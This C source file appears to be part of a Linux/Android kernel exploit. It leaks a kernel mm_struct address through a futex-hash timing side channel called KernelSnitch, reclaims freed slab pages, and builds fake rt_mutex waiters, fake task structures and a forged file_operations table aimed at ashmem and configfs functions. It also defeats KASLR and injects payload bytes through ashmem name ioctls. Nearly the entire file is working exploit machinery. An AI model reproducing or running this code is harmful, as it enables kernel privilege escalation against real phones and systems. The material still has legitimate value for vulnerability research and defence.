#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
static int controlled_reclaim_sv[S918_RECLAIM_SOCKET_PAIRS - 1][2];
static size_t controlled_reclaim_count;
#endif
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
#if !defined(APP_CONTROLLED_MM_GROUP_RECLAIM) || \
    !APP_CONTROLLED_MM_GROUP_RECLAIM
static pid_t child_leak;
#endif

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static int rmg_fast_profile_enabled(void) {
#if defined(APP_DEFAULT_FAST_KSNITCH) && APP_DEFAULT_FAST_KSNITCH
  return 1;
#else
  const char *value = getenv("RMG_FAST");
  return value && *value && strcmp(value, "0") != 0;
#endif
}

static size_t rmg_profile_env_size(const char *name, size_t fallback,
                                   size_t min, size_t max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  unsigned long long parsed = strtoull(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    pr_warning("ignoring invalid %s=%s\n", name, value);
    return fallback;
  }
  return (size_t)parsed;
}

static void configure_kernelsnitch_profile(
    struct kernelsnitch_shared_state *state, int payload_mode) {
  size_t appended_futexes = APPENDED_FUTEXES;
  size_t repeat_measurement = REPEAT_MEASUREMENT;
  size_t average = AVERAGE;

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    appended_futexes = SLIDE_KSNITCH_APPENDED_FUTEXES;
    repeat_measurement = SLIDE_KSNITCH_REPEAT_MEASUREMENT;
    average = SLIDE_KSNITCH_AVERAGE;
  }

  /*
   * Collision measurement dominates the wall time on E2S.  FAST keeps the
   * collision count, confirmation count and exact address search unchanged;
   * it only uses the shorter measurement profile already proven by the slide
   * consumer.  Explicit variables make hardware A/B testing possible without
   * producing a new payload for every sample count.
   */
  if (rmg_fast_profile_enabled()) {
    appended_futexes = SLIDE_KSNITCH_APPENDED_FUTEXES;
    if (repeat_measurement > 32) {
      repeat_measurement = 32;
    }
    if (average > 4) {
      average = 4;
    }
  }
#endif

  appended_futexes = rmg_profile_env_size(
      "RMG_KSNITCH_APPENDED", appended_futexes, 256, 4096);
  repeat_measurement = rmg_profile_env_size(
      "RMG_KSNITCH_REPEAT", repeat_measurement, 8, REPEAT_MEASUREMENT);
  average = rmg_profile_env_size(
      "RMG_KSNITCH_AVERAGE", average, 1, repeat_measurement);
  if (average > repeat_measurement) {
    average = repeat_measurement;
  }

  kernelsnitch_set_profile(state, appended_futexes, repeat_measurement,
                           average);
  pr_info("KernelSnitch profile mode=%d fast=%d appended=%zu repeat=%zu "
          "average=%zu\n",
          payload_mode, rmg_fast_profile_enabled(), appended_futexes,
          repeat_measurement, average);
}

static void log_mm_slabinfo(const char *stage) {
  if (!getenv("SLUB_DIAG")) {
    return;
  }

  FILE *fp = fopen("/proc/slabinfo", "re");
  if (!fp) {
    pr_warning("mm slabinfo stage=%s open errno=%d\n", stage, errno);
    return;
  }

  char line[512];
  int found = 0;
  while (fgets(line, sizeof(line), fp)) {
    if (strncmp(line, "mm_struct ", strlen("mm_struct ")) != 0) {
      continue;
    }
    pr_info("mm slabinfo stage=%s %s", stage, line);
    found = 1;
    break;
  }
  fclose(fp);
  if (!found) {
    pr_warning("mm slabinfo stage=%s entry missing\n", stage);
  }
}

#endif

#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
static void touch_mm_slabinfo(void) {
  FILE *fp = fopen("/proc/slabinfo", "re");
  if (!fp) {
    return;
  }
  char line[512];
  unsigned long values[8];
  while (fgets(line, sizeof(line), fp)) {
    if (memcmp(line, "mm_struct ", 10)) {
      continue;
    }
    sscanf(line,
           "mm_struct %lu %lu %lu %lu %lu : tunables %*lu %*lu %*lu : slabdata %lu %lu %lu",
           &values[0], &values[1], &values[2], &values[3], &values[4],
           &values[5], &values[6], &values[7]);
    break;
  }
  fclose(fp);
}
#endif

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
static const uintptr_t slide_bank_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};
static uintptr_t slide_bank_payload_base;
static uintptr_t slide_bank_parents[SLIDE_BANK_SLOTS];
static uintptr_t slide_bank_targets[SLIDE_BANK_SLOTS];
static size_t slide_bank_lock_off = SLIDE_BANK_LOCK_OFF;
static size_t slide_bank_task_off = SLIDE_BANK_TASK_OFF;

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
    defined(SLIDE_S928_BANK_TASK_STRIDE)
#define ACTIVE_SLIDE_BANK_TASK_STRIDE SLIDE_S928_BANK_TASK_STRIDE
#else
#define ACTIVE_SLIDE_BANK_TASK_STRIDE SLIDE_BANK_TASK_STRIDE
#endif

static uintptr_t slide_bank_lock_owner(uintptr_t task) {
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
    defined(SLIDE_S928_BANK_LOCK_OWNER_TASK) && \
    SLIDE_S928_BANK_LOCK_OWNER_TASK
  return task | 1;
#else
  (void)task;
  return SLIDE_LOCK_OWNER_VALUE;
#endif
}

#if !(defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
      defined(SLIDE_S928_TASK_OFF_CANDIDATES))
_Static_assert(
    SLIDE_BANK_TASK_OFF + (SLIDE_BANK_SLOTS - 1) *
                              ACTIVE_SLIDE_BANK_TASK_STRIDE +
            FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t) <=
        SLIDE_BANK_LOCK_OFF,
    "slide task bank overlaps lock bank");
#endif
_Static_assert(
    SLIDE_BANK_LOCK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
        ORDER3_SIZE,
    "slide lock bank exceeds reclaimed page");
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
    defined(SLIDE_S928_BANK_LOCK_BASE)
_Static_assert(
    SLIDE_S928_BANK_LOCK_BASE +
            (SLIDE_S928_BANK_LOCK_MAX_BUCKET <<
             SLIDE_S928_BANK_LOCK_SHIFT) +
            (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
        ORDER3_SIZE,
    "S928 slide lock bank exceeds reclaimed page");
#endif
#if defined(APP_FOPS_TABLE_MIRROR_OFF)
_Static_assert(
    APP_FOPS_TABLE_MIRROR_OFF + 0x110 <= FOPS_TABLE_OFF,
    "mirrored FOPS table overlaps primary FOPS table");
#endif

static int configure_slide_bank_geometry(uintptr_t leaked,
                                         int payload_mode) {
  slide_bank_lock_off = SLIDE_BANK_LOCK_OFF;
  slide_bank_task_off = SLIDE_BANK_TASK_OFF;
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
    defined(SLIDE_S928_BANK_LOCK_BASE)
  size_t bucket =
      (leaked >> SLIDE_S928_BANK_LOCK_SHIFT) &
      SLIDE_S928_BANK_LOCK_BUCKET_MASK;
  if (bucket > SLIDE_S928_BANK_LOCK_MAX_BUCKET) {
    pr_warning("S928 lock bucket rejected=%zu max=%d mode=%d\n", bucket,
               SLIDE_S928_BANK_LOCK_MAX_BUCKET, payload_mode);
    return 0;
  }
  slide_bank_lock_off =
      SLIDE_S928_BANK_LOCK_BASE +
      (bucket << SLIDE_S928_BANK_LOCK_SHIFT);

#if defined(SLIDE_S928_TASK_OFF_CANDIDATES) && \
    defined(FOPS_S928_TASK_OFF_CANDIDATES)
  static const size_t slide_task_candidates[] = {
    SLIDE_S928_TASK_OFF_CANDIDATES
  };
  static const size_t fops_task_candidates[] = {
    FOPS_S928_TASK_OFF_CANDIDATES
  };
  const size_t *candidates = fops_task_candidates;
  size_t candidate_count =
      sizeof(fops_task_candidates) / sizeof(fops_task_candidates[0]);
  size_t task_span = FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t);
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    candidates = slide_task_candidates;
    candidate_count =
        sizeof(slide_task_candidates) / sizeof(slide_task_candidates[0]);
    task_span += (SLIDE_BANK_SLOTS - 1) * ACTIVE_SLIDE_BANK_TASK_STRIDE;
  }
  size_t lock_span = (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
                     SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE;
  slide_bank_task_off = 0;
  for (size_t i = 0; i < candidate_count; i++) {
    size_t candidate = candidates[i];
    if (candidate + task_span > ORDER3_SIZE) {
      continue;
    }
    if (candidate + task_span <= slide_bank_lock_off ||
        slide_bank_lock_off + lock_span <= candidate) {
      slide_bank_task_off = candidate;
      break;
    }
  }
  if (!slide_bank_task_off) {
    pr_warning("S928 task bank unavailable bucket=%zu lock=0x%zx mode=%d\n",
               bucket, slide_bank_lock_off, payload_mode);
    return 0;
  }
#endif
  pr_info("S928 bank bucket=%zu lock=0x%zx task=0x%zx mode=%d\n", bucket,
          slide_bank_lock_off, slide_bank_task_off, payload_mode);
#else
  (void)leaked;
  (void)payload_mode;
#endif
  return 1;
}
#endif

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
uintptr_t slide_p0_offset;
uintptr_t slide_oracle_parent;
uintptr_t slide_oracle_target;
uintptr_t p0_gate_page_struct;
uintptr_t p0_probe_page_struct;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
uintptr_t fops_data_probe_addr;
int fops_data_probe_active;
int data_alias_uses_slide = 1;
#endif
int data_addr_canonical;
char ashmem_path[256] = "/dev/ashmem";

__attribute__((weak)) void app_publish_writer_started(void) {
}

__attribute__((weak)) void app_publish_slide_ready(void) {
}

void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                            uintptr_t tree_parent, uintptr_t tree_right,
                            uintptr_t tree_left, uintptr_t pi_parent,
                            uintptr_t pi_right, uintptr_t pi_left,
                            uintptr_t task, uintptr_t lock,
                            uint32_t priority) {
  put64(payload, waiter_off + 0x00, tree_parent);
  put64(payload, waiter_off + 0x08, tree_right);
  put64(payload, waiter_off + 0x10, tree_left);
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
        pi_parent);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
#if COMPACT_RT_MUTEX_WAITER
  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
#endif
  put32(payload, waiter_off + FAKE_WAITER_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_DEADLINE_OFF, 0);
#if COMPACT_RT_MUTEX_WAITER
  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
#else
  put32(payload, waiter_off + FAKE_WAITER_TREE_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
        pi_parent);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
  put32(payload, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
int select_slide_payload_slot(uintptr_t offset) {
  if (!slide_bank_payload_base) {
    return 0;
  }
  for (size_t i = 0;
       i < sizeof(slide_bank_offsets) / sizeof(slide_bank_offsets[0]); i++) {
    if (slide_bank_offsets[i] != offset) {
      continue;
    }
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    return select_slide_payload_index(1);
#else
    return select_slide_payload_index(i);
#endif
  }
  return 0;
}

int select_slide_payload_index(size_t index) {
  if (!slide_bank_payload_base || index >= SLIDE_BANK_SLOTS) {
    return 0;
  }
  fake_task = slide_bank_payload_base + slide_bank_task_off +
              index * ACTIVE_SLIDE_BANK_TASK_STRIDE;
  fake_lock = slide_bank_payload_base + slide_bank_lock_off +
              index * SLIDE_BANK_SLOT_STRIDE;
  fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
  slide_oracle_parent = slide_bank_parents[index];
  slide_oracle_target = slide_bank_targets[index];
  return 1;
}

#if !defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE
static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
                                 size_t slot, uintptr_t parent,
                                 uintptr_t target) {
  size_t task_off =
      slide_bank_task_off + slot * ACTIVE_SLIDE_BANK_TASK_STRIDE;
  size_t lock_off = slide_bank_lock_off + slot * SLIDE_BANK_SLOT_STRIDE;
  size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
  uintptr_t task = payload_base + task_off;
  uintptr_t lock = payload_base + lock_off;
  uintptr_t waiter = payload_base + waiter_off;
  uintptr_t pi_right = 0;
  uintptr_t pi_left = target;
  uintptr_t lock_owner = slide_bank_lock_owner(task);
  uintptr_t waiter_task = task;
  uintptr_t task_group = 0;
  uintptr_t pi_waiters = waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF;
  uintptr_t pi_top_task = task;
  uint32_t waiter_prio = SLIDE_FAKE_WAITER_PRIO;

#if defined(P0_ORACLE_PRODUCTION_SLOT)
  if (slot == P0_ORACLE_PRODUCTION_SLOT) {
#if defined(APP_PRODUCTION_SLOT_PI_RIGHT) && \
    APP_PRODUCTION_SLOT_PI_RIGHT
    pi_right = target;
    pi_left = 0;
#elif defined(APP_PRODUCTION_SLOT_PROVEN_LEFT) && \
    APP_PRODUCTION_SLOT_PROVEN_LEFT
    /* Use the child direction proven by the exact gate/probe/restore writes. */
    pi_right = 0;
    pi_left = target;
#endif
#if defined(APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY) && \
    APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY
    /* Match the established non-banked PAGE_PAYLOAD_FOPS construction. */
    lock_owner = task | 1;
    waiter_task = text_addr(INIT_TASK);
    task_group = text_addr(ROOT_TASK_GROUP);
    pi_waiters = 0;
    pi_top_task = text_addr(INIT_TASK);
    waiter_prio = FAKE_WAITER_PRIO;
#endif
  }
#endif

  put32(p, lock_off + 0x00, 0);
  put64(p, lock_off + 0x08, waiter);
  put64(p, lock_off + 0x10, waiter);
  put64(p, lock_off + 0x18, lock_owner);
  put_fake_waiter(p, waiter_off, 1, 0, 0, parent, pi_right, pi_left,
                  waiter_task, lock, waiter_prio);
  put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
  put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
  put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
  put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, task_group);
  put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF, pi_waiters);
  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, pi_waiters);
  put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
  put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
}
#endif
#endif

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
  configure_kernelsnitch_profile(ks, PAGE_PAYLOAD_SLIDE);
#else
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  kernelsnitch_set_profile(
      ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
      SLIDE_KSNITCH_REPEAT_MEASUREMENT,
      SLIDE_KSNITCH_AVERAGE);
#endif
#endif
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked) {
#if KERNELSNITCH_MTE_ENABLED
  if (leaked != (uintptr_t)-1) {
    uintptr_t tagged = leaked;
    leaked |= 0xff00000000000000ULL;
    pr_info("KernelSnitch mm_struct tagged=%016zx untagged=%016zx\n",
            tagged, leaked);
  }
#endif
  return leaked;
}
#endif

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  return canonicalize_kernelsnitch_pointer(leaked);
#else
  return leaked;
#endif
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  const char *stack_writer = "pselect";
  const char *reclaim = "legacy";
  const char *fops_route = "bank";
  const char *pipe_order = "before-fops";
#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_MCAST) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
  stack_writer = "mcast";
#elif defined(SLIDE_STACK_WRITER) && \
      defined(SLIDE_STACK_WRITER_SIGRETURN) && \
      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
  stack_writer = "sigreturn";
#endif
#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
  reclaim = "controlled";
#endif
#if defined(APP_CLOSED_FOPS_ROUTE) && APP_CLOSED_FOPS_ROUTE
  fops_route = "direct";
#endif
#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
  pipe_order = "after-fops";
#endif
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s stack_writer=%s reclaim=%s fops=%s pipe=%s\n",
             getpid(), BUILD_VARIANT_LABEL, stack_writer, reclaim,
             fops_route, pipe_order);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER_NAME,
             (unsigned long long)SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_direct_addr(uintptr_t image_addr) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  uintptr_t address = p0_data_alias(image_addr);
  return data_alias_uses_slide ? address + slide_p0_offset : address;
#else
  return p0_data_alias(image_addr) + slide_p0_offset;
#endif
}

uintptr_t data_addr(uintptr_t image_addr) {
  return data_addr_canonical ? text_addr(image_addr)
                             : data_direct_addr(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
  for (size_t pair = 0; pair < controlled_reclaim_count; ++pair) {
    for (size_t side = 0; side < 2; ++side) {
      if (controlled_reclaim_sv[pair][side] >= 0) {
        close(controlled_reclaim_sv[pair][side]);
        controlled_reclaim_sv[pair][side] = -1;
      }
    }
  }
  controlled_reclaim_count = 0;
#endif
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

int reclaim_receiver_fd(void) {
  return reclaim_sv[1];
}

